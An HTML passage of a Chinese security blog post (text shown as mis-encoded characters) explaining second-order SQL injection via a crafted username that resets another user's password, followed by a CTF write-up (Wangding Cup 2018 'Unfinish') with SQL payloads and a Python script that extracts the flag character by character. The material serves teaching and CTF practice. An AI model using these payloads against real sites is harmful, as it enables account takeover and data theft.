        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;center>'</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
           <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Password successfully updated"</span><span class="token punctuation">;</span>
    
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">&#123;</span>
           <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: failed.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token comment">//echo 'You tried to be smart, Try harder!!!! :( ';</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">&lt;center>'</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Make sure New Password and Retype Password fields have same value"</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh:2, url=index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span></code></pre>

<p>é€šè¿‡æºç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>$username</code>æ˜¯ç›´æ¥ä»<code>session</code>ä¸­è¯»å–çš„ï¼Œå¹¶ä¸”æ²¡æœ‰è¿›è¡Œå‚æ•°çš„è½¬ä¹‰å¤„ç†ã€‚<code>curr_pass</code>å’Œ<code>re_pass</code>ç»è¿‡äº†å‡½æ•°<code>mysql_real_escape_string</code>è½¬ä¹‰å¤„ç†ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ§åˆ¶<code>username</code>è¿™ä¸ªå˜é‡è¿›è¡Œç›¸å…³æ³¨å…¥æ“ä½œã€‚</p>
<p>ç”¨æˆ·æ³¨å†ŒæˆåŠŸåï¼Œä¼šå°†ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯å†™å…¥åˆ°æ•°æ®åº“ä¸­å­˜å‚¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151215700.png" alt="image-20210128151215700" loading="lazy"></p>
<p>å‰é¢æˆ‘ä»¬æåˆ°<code>mysql_real_escape_string</code>å‡½æ•°å¯ä»¥å°†å­—ç¬¦ä¸²è½¬ä¹‰ç›´æ¥å†™å…¥åˆ°æ•°æ®åº“ä¸­å­˜å‚¨ã€‚</p>
<p>å¹¶ä¸”ç”±æºç æˆ‘ä»¬çŸ¥é“ä¿®æ”¹å¯†ç çš„<code>SQL</code>ä»£ç ä¸ºï¼š</p>
<p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p>
<p><code>username</code>å˜é‡æ˜¯ç›´æ¥è¯»å–æ•°æ®åº“çš„å†…å®¹ï¼Œå¹¶ä¸”æ²¡æœ‰ç»è¿‡è½¬ä¹‰ã€‚</p>
<p>è¿™è¾¹çš„æ€è·¯æ˜¯ï¼Œå¯ä»¥ç›´æ¥æ„é€ ä¸€ä¸ª<code>test&#39;#</code>ç”¨æˆ·ï¼Œæ–°å»ºæ­¤ç”¨æˆ·ï¼Œå†ç™»å½•è¿›è¡ŒäºŒæ¬¡ç”¨æˆ·è°ƒç”¨ä¿®æ”¹å¯†ç çš„æ—¶å€™ï¼ŒåŸ<code>SQL</code>è¯­å¥å˜ä¸º:</p>
<p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;test&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p>
<p>ç”±äº#å·æ³¨é‡Šæ‰äº†åé¢çš„è¯­å¥ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬æœ¬æ¥ä¿®æ”¹çš„<code>test&#39;#</code>çš„å¯†ç ï¼Œä½†å®é™…ä¸Šä¿®æ”¹äº†<code>test</code>çš„å¯†ç ï¼Œè€Œä¸”<code>test&#39;#</code>å½“å‰å¯†ç å¯ä»¥ä»»æ„è¾“å…¥ã€‚</p>
<p>åˆ›å»º<code>test&#39;#</code>ç”¨æˆ·</p>
<p>ç”¨æˆ·å<code>test&#39;#</code> å¯†ç <code>88888</code> åˆ›å»ºå®Œæˆåï¼Œæ­£å¸¸ç™»é™†</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151235080.png" alt="image-20210128151235080" loading="lazy"></p>
<p>æŸ¥çœ‹æ•°æ®ï¼Œå‘ç°ç”¨æˆ·<code>test&#39;#</code>å·²è¢«æˆåŠŸå†™å…¥æ•°æ®åº“ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151249140.png" alt="image-20210128151249140" loading="lazy"></p>
<p>ä¿®æ”¹å½“å‰ç”¨æˆ·å¯†ç </p>
<p>ä¿®æ”¹å½“å‰ç”¨æˆ·æ–°å¯†ç ä¸º<code>66666</code>ï¼Œå¹¶ä¸”ç”¨æˆ·çš„å½“å‰å¯†ç ä¸º<code>888888</code>ï¼Œæ­¤å¤„å¯ä»¥è¾“å…¥ä»»æ„çš„å¯†ç ä¸º<code>222222</code>ï¼Œå¯ä»¥æ­£å¸¸ä¿®æ”¹å¯†ç ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151303856.png" alt="image-20210128151303856" loading="lazy"></p>
<p>æŸ¥çœ‹æ•°æ®åº“ï¼Œå‘ç°<code>test</code>ç”¨æˆ·è¢«æ­£å¸¸ä¿®æ”¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151316265.png" alt="image-20210128151316265" loading="lazy"></p>
<p>ç”±æ­¤å°±æ˜¯æ•´ä¸ªäºŒæ¬¡æ³¨å…¥çš„åˆ©ç”¨è¿‡ç¨‹ï¼Œè¿™è¾¹æˆ‘é—¨åªè¦ç›¸åº”çš„æ„é€ ç®¡ç†å‘˜çš„ç”¨æˆ·åå°±å¯ä»¥ä»»æ„ä¿®æ”¹ç®¡ç†å‘˜è´¦æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<h2 id="çœŸé¢˜ç¯å¢ƒå¤ç°-ç½‘é¼æ¯2018-Unfinish"><a href="#çœŸé¢˜ç¯å¢ƒå¤ç°-ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="çœŸé¢˜ç¯å¢ƒå¤ç°(ç½‘é¼æ¯2018-Unfinish)"></a>çœŸé¢˜ç¯å¢ƒå¤ç°(ç½‘é¼æ¯2018-Unfinish)</h2><h3 id="é¢˜ç›®å¤ç°"><a href="#é¢˜ç›®å¤ç°" class="headerlink" title="é¢˜ç›®å¤ç°"></a>é¢˜ç›®å¤ç°</h3><p>ä½¿ç”¨buuå¹³å°å¤ç°</p>
<p><code>ç½‘é¼æ¯2018-Unfinish</code></p>
<h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¦–å…ˆè¯·æ±‚å‘ç°æ˜¯ä¸€ä¸ªç™»å½•é¡µï¼Œä½¿ç”¨å‡ ä¸ªå¸¸ç”¨ç”¨æˆ·åå’Œå¯†ç å°è¯•ç™»å½•ï¼Œæ²¡æœ‰ä»»ä½•ä¿¡æ¯ï¼›</p>
<p>ä½¿ç”¨webæ‰«æå™¨ï¼Œå‘ç°å­˜åœ¨<code>register.php</code>æ³¨å†ŒåŠŸèƒ½é¡µé¢ï¼Œå°è¯•æ³¨å†Œä¸€ä¸ªç”¨æˆ·å¹¶ç™»å½•ï¼›</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128193107498.png" alt="image-20210128193107498" loading="lazy"></p>
<p>ç™»å½•æˆåŠŸåï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç™»å½•æˆåŠŸé¡µå‘ç°ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åï¼›</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128193219077.png" alt="image-20210128193219077" loading="lazy"></p>
<p>é‚£ä¹ˆè¿™ç§é¢˜å‹æˆ‘ä»¬èƒ½æƒ³åˆ°å°±æ˜¯äºŒæ¬¡æ³¨å…¥çš„å¯èƒ½æ€§æœ€å¤§ï¼›</p>
<p>å¹¶ä¸”æ³¨å†Œæ—¶æœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯æ³¨å†ŒæˆåŠŸä¼šå¾—åˆ°302çš„çŠ¶æ€ç å¹¶è·³è½¬è‡³<code>login.php</code>ï¼›å¦‚æœæ³¨å†Œå¤±è´¥ï¼Œåªä¼šè¿”å›200çš„çŠ¶æ€ç ï¼›</p>
<p>å¹¶ä¸”é‡Œé¢æœ‰ä¸€å®šçš„å­—ç¬¦ä¸²è¿‡æ»¤,ç®€å•æµ‹è¯•ï¼Œå¤§æ¦‚è¿‡æ»¤äº†<code>é€—å·ï¼Œinformation_schema</code>ç­‰å­—ç¬¦ï¼›</p>
<p>ä¸€èˆ¬è¿‡æ»¤äº†<code>information_schema</code>å­—ç¬¦çš„è¯ï¼Œå°±å¾ˆå°‘å¯èƒ½åœ¨å†èƒ½ç›´æ¥æ‹†è§£åº“è¡¨å­—æ®µåï¼Œæ‰€ä»¥è¿™é‡ŒçŒœæµ‹æ˜¯flag;</p>
<p>payload:<code>0&#39;%2bascii(substr(database() from 1 for 1))%2b&#39;0</code>ï¼›æ³¨å†ŒåæˆåŠŸè·å–åˆ°åº“åç¬¬ä¸€ä¸ªé¦–å­—æ¯çš„<code>ascii</code>å€¼ï¼›</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129133636903.png" alt="image-20210129133636903" loading="lazy"></p>
<p>æ„é€ è·å–<code>flag</code>çš„<code>payload</code>;<code>0&#39;%2bascii(substr((select * from flag) from 1 for 1))%2b&#39;0</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129134724322.png" alt="image-20210129134724322" loading="lazy"></p>
<p>æŒ‰ç…§æ­¤æ–¹æ³•ä»¥ä¾æ¬¡çŒœè§£flagçš„å­—æ®µå†…å®¹å³å¯ï¼Œè¿™é‡Œç›´æ¥ä¸Šè„šæœ¬ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env pyton3</span>
<span class="token comment"># -*- coding:utf-8 -*-</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys


register_url <span class="token operator">=</span> <span class="token string">'http://34de0eee-d1e3-42cd-a1cd-5127e8032f8f.node3.buuoj.cn/register.php'</span>
login_url <span class="token operator">=</span> <span class="token string">'http://34de0eee-d1e3-42cd-a1cd-5127e8032f8f.node3.buuoj.cn/login.php'</span>

email <span class="token operator">=</span> <span class="token string">"admin&#123;&#125;@qq.com"</span>
payload <span class="token operator">=</span> <span class="token string">"0'+ascii(substr((select * from flag) from &#123;&#125; for 1))+'0"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
		<span class="token string">'email'</span><span class="token punctuation">:</span> email<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> 
		<span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">"admin"</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">#print(data)</span>
	r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> register_url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
	r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> login_url<span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'email'</span><span class="token punctuation">:</span> email<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token comment">#print(r2.text)</span>
	pattern <span class="token operator">=</span> <span class="token string">r'&lt;span class=\"user-name\">\s*(\d&#123;1,10&#125;)\s*&lt;'</span>
	flag_str <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
	sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129143131058.png" alt="image-20210129143131058" loading="lazy"></p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="æ‰“èµ" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">é’±æ˜¯ä¸‡èƒ½çš„</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-wechat.png"><img loading="lazy" src="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-wechat.png" alt="æ”¯ä»˜å®" title="æ”¯ä»˜å®"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-alipay.png"><img loading="lazy" src="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-alipay.png" alt="å¾®ä¿¡æ”¯ä»˜" title="å¾®ä¿¡æ”¯ä»˜"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>ä¸¨greetdawnä¸¨</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://www.greetdawn.top/2021/02/01/web-security/sql-injection/sql-injection-advanced/" title="SQLæ³¨å…¥ä¸­çš„ç‚¹ç‚¹æ»´æ»´">http://www.greetdawn.top/2021/02/01/web-security/sql-injection/sql-injection-advanced/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> è®¸å¯åè®®ã€‚</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/02/03/config/mysql-config/" rel="prev" title="mysqlä¸­å¸¸ç”¨çš„é…ç½®æ“ä½œ"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">mysqlä¸­å¸¸ç”¨çš„é…ç½®æ“ä½œ</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/01/05/web-security/php-code-audit/php-audit-74cmsssti-readfile/" rel="next" title="74cmæ¨¡æ¿æ³¨å…¥ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æ"><span class="post-nav-text">74cmæ¨¡æ¿æ³¨å…¥ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æ</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>å°è¯•ä½¿ç”¨ Disqus è¯„è®ºç³»ç»Ÿã€‚</span><br><span>æ‚¨å¯ä»¥ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®åˆ‡æ¢å¯¹åº”è¯„è®ºç³»ç»Ÿã€‚</span><br><a class="hty-button hty-button--raised" id="github-issues" target="_blank" rel="noopener" href="https://github.com/greetdawn/greetdawn.github.io/issues?q=is:issue+SQLæ³¨å…¥ä¸­çš„ç‚¹ç‚¹æ»´æ»´">GitHub Issues</a></div><div class="toggle-comment-system" style="margin: 1rem auto"><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target="#valine-container" onclick="showComment(this.dataset.target)">valine</a><style>#disqus_thread {
  display: none;
}</style><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target="#disqus_thread" onclick="showComment(this.dataset.target)">disqusjs</a><script>function hideAllComment() {
  //- hide all
  document.querySelectorAll('.toggle-comment-btn').forEach((btn) => {
    const container = document.querySelector(btn.dataset.target);
    if (container) {
      container.style.display = "none";
    }
  });
}
function showComment(target) {
  hideAllComment();
  //- show target
  const targetContainer = document.querySelector(target);
  if (targetContainer) {
    targetContainer.style.display = "block";
  }
}
</script></div><div id="disqus_thread"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@latest/dist/disqusjs.css"><script src="https://cdn.jsdelivr.net/npm/disqusjs@latest/dist/disqus.js"></script><script>const disqusjsConfig = {"enable":true,"shortname":"yunyoujun","apikey":"ouoGQCaamOKdJgyZU5DKcpFnRIg3SNzvk0nwygPtlcTRJuE68c8igvrZGW4wAJoN"}
function loadDisqus() {
  const dsqjs = new DisqusJS(disqusjsConfig)
}</script><script src="/js/comments/disqus.js"></script><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
  const valineConfig = {"enable":true,"appId":"4x0IwQ1sy95mOGQDTO8MYCeA-gzGzoHsz","appKey":"9loqwF3UDklPDHaP9IN2uwN8","placeholder":"å¤§ä½¬æ±‚æŒ‡æ•™&nbsp_(:Ğ·ã€âˆ )_ ï¼ˆå¡«å†™é‚®ç®±å¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥ï½ï¼‰","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"serverURLs":"https://lncld.yunyoujun.cn","requiredFields":["nick","mail"],"emojiCDN":"//i0.hdslb.com/bfs/emote/","emojiMaps":{"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_äº²äº²":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_å·ç¬‘":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_å†è§":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_å†·æ¼ ":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_å‘æ€’":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_å‘è´¢":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_å¯çˆ±":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_åè¡€":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_å‘†":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_å‘•å":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_å›°":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_åç¬‘":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_å¤§ä½¬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_å¤§å“­":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_å§”å±ˆ":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_å®³ç¾":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_å°´å°¬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_å¾®ç¬‘":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_æ€è€ƒ":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_æƒŠå“":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png","tv_æ‰“è„¸":"56ab10b624063e966bfcb76ea5dc4794d87dfd47.png","tv_æŠ“ç‹‚":"fe31c08edad661d63762b04e17b8d5ae3c71a757.png","tv_æŠ é¼»":"c666f55e88d471e51bbd9fab9bb308110824a6eb.png","tv_æ–œçœ¼ç¬‘":"911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png","tv_æ— å¥ˆ":"ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png","tv_æ™•":"5443c22b4d07fb1907ccc610c8e6db254f2461b7.png","tv_æµæ±—":"cead1c351ab8d79e9f369605beb90148db0fbed3.png","tv_æµæ³ª":"7e71cde7858f0cd50d74b0264aa26db612a8a167.png","tv_æµé¼»è¡€":"c32d39db2737f89b904ca32700d140a9241b0767.png","tv_ç‚¹èµ":"f85c354995bd99e28fc76c869bfe42ba6438eff4.png","tv_ç”Ÿæ°”":"26702dcafdab5e8225b43ffd23c94ac1ff932654.png","tv_ç”Ÿç—…":"8b0ec90e6b86771092a498c54f09fc94621c1900.png","tv_ç–‘é—®":"0793d949b18d7be716078349c202c15ff166f314.png","tv_ç™½çœ¼":"c1d59f439e379ee50eef488bcb5e5378e5044ea4.png","tv_çš±çœ‰":"72ccad6679fea0d14cce648b4d818e09b8ffea2d.png","tv_ç›®çªå£å‘†":"0b8cb81a68de5d5365212c99375e7ace3e7891b7.png","tv_ç¡ç€":"8b196675b53af58264f383c50ad0945048290b33.png","tv_ç¬‘å“­":"1abc628f6d4f4caf9d0e7800878f4697abbc8273.png","tv_è…¼è…†":"89712c0d4af73e67f89e35cbc518420380a7f6f4.png","tv_è‰²":"61822c7e9aae5da76475e7892534545336b23a6f.png","tv_è°ƒä¾ƒ":"4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png","tv_è°ƒçš®":"b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png","tv_é„™è§†":"6e72339f346a692a495b123174b49e4e8e781303.png","tv_é—­å˜´":"c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png","tv_éš¾è¿‡":"87f46748d3f142ebc6586ff58860d0e2fc8263ba.png","tv_é¦‹":"fc7e829b845c43c623c8b490ee3602b7f0e76a31.png","tv_é¬¼è„¸":"0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png","tv_é»‘äººé—®å·":"45821a01f51bc867da9edbaa2e070410819a95b2.png","tv_é¼“æŒ":"1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"},"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = "/2021/02/01/web-security/sql-injection/sql-injection-advanced/"
  new Valine(valineConfig)
}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">greetdawn</a></div><div class="copyright"><span>&copy; 2018 â€“ 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> ä¸¨greetdawnä¸¨</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v5.4.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.2</span></div><div class="live_time"><span>æœ¬åšå®¢å·²èŒèŒå“’åœ°è¿è¡Œ</span><span id="display_live_time"></span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2019-04-12T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " å¤© " + passHour + " å°æ—¶ " + passMinute + " åˆ† " + passSecond + " ç§’";
}
blog_live_time();
</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>